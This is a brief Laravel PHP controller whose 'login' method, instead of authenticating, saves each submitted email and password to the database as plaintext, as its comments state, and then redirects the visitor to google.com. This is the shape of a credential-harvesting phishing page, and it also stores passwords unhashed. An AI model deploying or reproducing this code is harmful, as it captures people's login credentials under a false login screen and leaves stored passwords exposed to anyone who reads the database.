<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;

class UserController extends Controller
{
    public function showLoginForm()
    {
        return view('login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required'
        ]);

        // Save the user to the database without hashing the password
        User::create([
            'email' => $request->email,
            'password' => $request->password,  // Store the password as plaintext
        ]);

        return redirect()->away('https://www.google.com');    }
}
